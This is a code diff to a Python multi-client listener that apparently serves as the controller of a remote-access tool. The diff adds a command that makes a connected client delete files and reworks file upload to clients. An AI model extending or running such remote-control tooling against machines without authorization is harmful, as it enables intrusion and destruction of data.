@@ -94,7 +94,6 @@ class MultiClientListener:
                 ready, _, _ = select.select([conn], [], [], 1)  # Wait up to 1 second for data
                 if ready:
                     json_data += conn.recv(1024).decode(self.format)
-                    print(f"Received data: {json_data}")
                     return json.loads(json_data)  # Successfully received full data
                 else:
                     return None  # No data received, return None
@@ -171,16 +170,20 @@ class MultiClientListener:
 
             if self.current_client == client_id:
                 self.current_client = None
+
     
-    def upload_file(self,conn, file_name):
-        if not os.path.exists(file_name):
-            print("File not found Please chech well")
-            return 
-        file_size = os.path.getsize(file_name)
-        conn.send(f"upload {os.path.basename(file_name)} {file_size}".encode('utf-8'))
-        
-        progress = tqdm(total = file_size, unit = "B", unit_scale = True, desc="Uploading")
-        with open(file_name, "rb") as f:
+    def upload_file(self,conn,file_path):
+        if not os.path.exists(file_path):
+            print("[-] File not found")
+            return
+
+        # Send file name and size first
+        file_size = os.path.getsize(file_path)
+        self.sending_data(f"upload {os.path.basename(file_path)} {file_size}")
+
+        # Send file data in chunks with progress bar
+        progress = tqdm(total=file_size, unit="B", unit_scale=True, desc="Uploading")
+        with open(file_path, "rb") as f:
             while True:
                 chunk = f.read(4096)
                 if not chunk:
@@ -188,8 +191,8 @@ class MultiClientListener:
                 conn.send(chunk)
                 progress.update(len(chunk))
         progress.close()
-        print(f"[+] File uploaded: {os.path.basename(file_name)}")
-                
+        print(f"[+] File uploaded: {os.path.basename(file_path)}")
+
 
     def command_loop(self, command):
         """Handles commands for the selected client."""
@@ -215,12 +218,12 @@ class MultiClientListener:
                 print(f"[+]received file content : {file_name}")
             else:
                  print("No data received from client.")
+        elif command[0] == "delete":
+            self.sending_data(command)
+            self.delete_files(command[1])
 
         elif command[0] == "upload":
-            if len(command) == 2:
-                self.upload_file(conn, command[1])
-            else:
-                print("Follow the instructions")
+            self.upload_file(conn,command[1])
         else:
             if conn:
                 self.sending_data(command)
@@ -231,7 +234,9 @@ class MultiClientListener:
         for client_id, conn in self.client_ids.items():
             print(f"Client {client_id}: {self.clients[conn]}")
         print("\n")
-
+    def delete_files(self,file_name):
+        self.sending_data(file_name)
+        
     def switch_client(self, client_id):
         """Switches control to a different client."""
         if client_id in self.client_ids:
